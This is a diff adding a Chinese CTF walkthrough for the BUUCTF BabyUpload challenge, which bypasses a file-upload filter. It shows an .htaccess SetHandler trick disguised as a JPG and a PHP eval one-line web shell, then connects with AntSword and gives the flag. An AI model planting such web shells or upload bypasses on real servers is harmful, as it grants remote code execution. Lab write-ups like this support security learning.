@@ -1506,6 +1506,53 @@ echo $baimao;
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134676460?spm=1001.2014.3001.5501
 
+## BUUCTF [GXYCTF2019]BabyUpload 1详解（.htaccess配置文件特性）
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701235409782-e901d29b-8f26-4e12-8996-7f7ae2dd386f.png#averageHue=%23f8f7f5&clientId=u5b3e342d-eb24-4&from=paste&height=120&id=u56e2bf0a&originHeight=150&originWidth=1669&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26766&status=done&style=none&taskId=u70087e5a-aa5c-4597-839f-9cb09508453&title=&width=1335.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701235373839-6143857c-b66f-478e-930b-fe9afec109cf.png#averageHue=%23fdfdfc&clientId=u5b3e342d-eb24-4&from=paste&height=553&id=uafeeb24a&originHeight=691&originWidth=652&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71445&status=done&style=none&taskId=udaecbb39-18f3-4430-8a6a-1d32cde5742&title=&width=521.6)<br />查看题目源码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701235483079-74f5cd03-9b01-4f94-a02e-9e33e2646790.png#averageHue=%23fdfcfc&clientId=u5b3e342d-eb24-4&from=paste&height=788&id=ud7495f70&originHeight=985&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134446&status=done&style=none&taskId=u9ffba73f-24ef-4188-97ff-8192ef4ed63&title=&width=1524)
+> SetHandler application/x-httpd-php
+> 通过源码可以看出这道文件上传题目主要还是考察.htaccess配置文件的特性
+> 倘若不先上传.htaccess配置文件，那么后台服务器就无法解析php代码
+> 这个是需要注意的
+
+.htaccess配置文件特性
+> 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+
+.htaccess配置文件格式
+> <FileMatch "xxx.jpg>
+> SetHandler application/x-httpd-php
+> </FileMatch>
+
+创建.htaccess配置文件
+> SetHandler application/x-httpd-php
+
+> Kali创建txt文件输入上面的配置命令，并将其命名为111.jpg文件
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701236074132-84696317-c428-48ef-88ff-c31fb0abaa15.png#averageHue=%23262933&clientId=u5b3e342d-eb24-4&from=paste&height=125&id=u11dfb287&originHeight=156&originWidth=733&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24052&status=done&style=none&taskId=u33ba8a99-f005-4a50-8cd3-8137a89a519&title=&width=586.4)<br />上传.htaccess配置文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701236588904-7818d35d-93a0-478a-bf19-59317cc2f884.png#averageHue=%23fcfcfc&clientId=u5b3e342d-eb24-4&from=paste&height=545&id=u8b562d05&originHeight=681&originWidth=1328&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54914&status=done&style=none&taskId=u3c16b4c4-012e-4545-b504-3459a75f4a6&title=&width=1062.4)<br />burp抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701236711807-3c8f4a85-a24d-4aa2-b02c-0bfe7522e220.png#averageHue=%23f4f3f3&clientId=u5b3e342d-eb24-4&from=paste&height=701&id=ucf2ee362&originHeight=876&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154562&status=done&style=none&taskId=u10c433d9-f82e-4808-9225-07eead527ee&title=&width=1305.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701236841261-02cf1e9c-9984-45b7-b51f-f43477fd6ca1.png#averageHue=%23fefefe&clientId=u5b3e342d-eb24-4&from=paste&height=419&id=ub372232e&originHeight=524&originWidth=1418&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49545&status=done&style=none&taskId=u052e0b99-d83e-4e79-ba58-565a031e6de&title=&width=1134.4)
+> 这里猜测.htaccess文件被过滤
+> 所以不能直接上传.htaccess配置文件
+> 先截断数据包再把上传的111.jpg文件更名为.htaccess文件
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237069301-ec745add-b1bc-4b0f-888f-e131c27ba464.png#averageHue=%23f3f2f2&clientId=u5b3e342d-eb24-4&from=paste&height=702&id=u8375b128&originHeight=877&originWidth=1629&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=162674&status=done&style=none&taskId=ubb0c1d48-1ca5-4e11-9118-4263912a606&title=&width=1303.2)<br />右键Repeater<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237112026-794f3628-cb62-497c-a67b-f9c941dfefa4.png#averageHue=%23f2f1f1&clientId=u5b3e342d-eb24-4&from=paste&height=706&id=u17a310bb&originHeight=883&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209842&status=done&style=none&taskId=u2060ec83-f37e-48e2-9f3b-3cf629603e6&title=&width=1305.6)<br />Send<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237179973-2c8b766f-0e8a-4520-9c83-33d93a1dd8a0.png#averageHue=%23f4f3f3&clientId=u5b3e342d-eb24-4&from=paste&height=702&id=u39850f12&originHeight=877&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174889&status=done&style=none&taskId=u0c8a38f8-02fb-4b6a-b608-fecf2e0e724&title=&width=1305.6)
+> 上传成功
+> 现在我们的jpg一句话木马文件就可以当作PHP代码来执行了
+
+创建木马文件<br />`<script language='php'>@eval($_REQUEST['shell']);</script>`
+> 在Kali里面创建txt文件，输入以上代码，并将其保存命名为flag.jpg
+
+上传木马文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237789058-252c8756-83fd-40d3-a5f4-695a4ff2283b.png#averageHue=%23b8bfb3&clientId=u5b3e342d-eb24-4&from=paste&height=225&id=u2d50e99c&originHeight=281&originWidth=942&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35251&status=done&style=none&taskId=u21245118-0331-4428-96fa-5a7655fc256&title=&width=753.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237823091-c4451952-cbd6-43ad-808b-467c522845e3.png#averageHue=%23f3f2f2&clientId=u5b3e342d-eb24-4&from=paste&height=698&id=u6ef38460&originHeight=872&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174236&status=done&style=none&taskId=u54241b3c-680e-4dd2-b2f2-b78fb4a0b45&title=&width=1304)
+> 上传成功
+> 访问上传路径链接
+
+`http://789b3aeb-6590-4b6a-89bb-17c389233df7.node4.buuoj.cn:81/upload/ff435120073c8f309f3001ca17632671/flag.jpg`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701237937854-4cfa3c53-cf81-4fb3-b406-08f3fdc57e7e.png#averageHue=%23faf9f8&clientId=u5b3e342d-eb24-4&from=paste&height=157&id=ECX8s&originHeight=196&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29248&status=done&style=none&taskId=u88a20c8a-5179-4c0d-a84a-19d13fbaab6&title=&width=1532)
+> 并未呈现图片格式
+> 访问成功
+
+**中国蚁剑连接**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701238279328-01541a61-c24a-42f1-a3df-93968d7eaba9.png#averageHue=%23f6f6f6&clientId=u5b3e342d-eb24-4&from=paste&height=862&id=u18e0990c&originHeight=1078&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121865&status=done&style=none&taskId=u3c46f5e0-b41a-4d0a-8cf8-c0bbee050b8&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701238317783-e886b072-a294-4b9e-81a4-1088d899f2de.png#averageHue=%23f1f1f0&clientId=u5b3e342d-eb24-4&from=paste&height=222&id=u99227b8d&originHeight=278&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30362&status=done&style=none&taskId=ud4ce7659-a439-434b-94a5-17f0180e35c&title=&width=1536)
+> 在根目录下发现flag
+
+**得到flag：**<br />`flag{74de0d6c-9d71-455c-96d3-a264277112c9}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134688843?spm=1001.2014.3001.5501
 
 
 
